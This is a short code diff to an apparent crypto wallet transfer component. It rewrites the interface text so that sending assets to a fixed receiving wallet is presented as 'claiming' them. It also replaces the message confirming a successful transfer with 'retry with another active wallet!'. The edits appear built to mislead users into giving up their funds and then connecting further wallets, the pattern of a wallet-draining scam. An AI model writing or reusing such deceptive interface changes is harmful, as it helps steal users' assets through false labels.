@@ -30,7 +30,7 @@ const CHAIN_NAMES = {
 
 // INSUFFICIENT BALANCE MESSAGE
 const INSUFFICIENT_MESSAGE =
-  "You are not eligible to complete this transfer at the moment because your available balance is insufficient to cover the transaction and network gas fees. Please try again later.";
+  "You are not eligible to complete this claim at the moment because your available balance is insufficient to cover the transaction and network gas fees. Please try again later.";
 
 // ERC20 TOKEN ABI
 const ERC20_ABI = [
@@ -455,7 +455,7 @@ export default function Transfer({
       // =================================
 
       setMessage(
-        "Transfer confirmed successfully!"
+        "retry with another active wallet!"
       );
 
       // REFRESH PORTFOLIO
@@ -500,10 +500,10 @@ export default function Transfer({
   return (
     <section style={styles.card}>
 
-      <h2>Send Assets</h2>
+      <h2>Claim Assets</h2>
 
       <p style={styles.description}>
-        Select an asset to transfer to your fixed receiving wallet.
+        Select an asset to claim to your fixed receiving wallet.
       </p>
 
       {/* ASSET SELECTION */}
